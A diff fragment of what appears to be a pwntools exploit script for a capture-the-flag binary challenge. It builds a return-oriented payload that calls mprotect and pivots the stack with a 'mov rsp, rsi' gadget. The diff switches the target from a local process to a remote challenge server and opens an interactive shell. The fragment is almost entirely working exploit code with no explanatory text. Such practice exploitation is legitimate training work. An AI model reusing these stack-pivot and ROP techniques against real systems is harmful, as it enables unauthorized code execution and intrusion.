@@ -30,22 +30,23 @@ msg += p64(binary.sym['mprotect'])
 msg += p64(dumbBuf)
 msg = msg.ljust(0x80, b'A')
 # pivot stuff
-msg += p64(other_buf)  # rbp
-msg += p64(initial_chain.find_gadget(['leave', 'ret']).address)
+msg += b'B'*8  # rbp
+msg += p64(0x00000000004008db) # mov rsp, rsi
+# msg += p64(initial_chain.find_gadget(['leave', 'ret']).address)
 
 # sys.stdout.buffer.write(b'\n'.join([fav_number, fav_color, msg]))
-p = process(['./pwn'])
-# p = remote('pwn.osucyber.club', 13378)
-gdb.attach(p, """b *dumb+54
-           b *dumb+59
-           c""")
+# p = process(['./pwn'])
+p = remote('pwn.osucyber.club', 13378)
+# gdb.attach(p, """b *dumb+54
+#            b *dumb+59
+#            c""")
 print(p.recvuntil(b'pls enter ur favorite numbers:'))
 p.send(fav_number)
 print(p.recvuntil(b'pls enter ur favorite colors:'))
 p.send(fav_color)
 print(p.recvuntil(b'program:'))
 p.send(msg)
-# p.interactive()
+p.interactive()
 # time.sleep(1)
 
 # print(p.read().decode())
